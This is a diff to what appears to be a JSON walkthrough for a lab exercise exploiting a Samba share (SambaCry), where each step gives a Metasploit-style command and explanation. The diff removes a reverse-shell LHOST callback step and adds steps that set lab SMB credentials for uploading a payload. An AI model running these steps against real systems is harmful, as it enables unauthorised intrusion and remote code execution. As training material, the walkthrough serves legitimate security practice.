@@ -53,12 +53,17 @@
     {
       "title": "Set writable share",
       "command": "set SMB_SHARE_NAME data",
-      "explanation": "The share where we'll upload our payload. Usually 'data' or 'tmp'."
+      "explanation": "The share where we'll upload our payload."
     },
     {
-      "title": "Set your IP for reverse shell",
-      "command": "set LHOST 172.20.0.5",
-      "explanation": "Kali's IP for the callback connection."
+      "title": "Set SMB username",
+      "command": "set SMBUser sambacry",
+      "explanation": "This share requires authentication. Username: sambacry"
+    },
+    {
+      "title": "Set SMB password",
+      "command": "set SMBPass nosambanocry",
+      "explanation": "Password: nosambanocry (weak credentials found via enumeration)"
     },
     {
       "title": "Run the exploit",
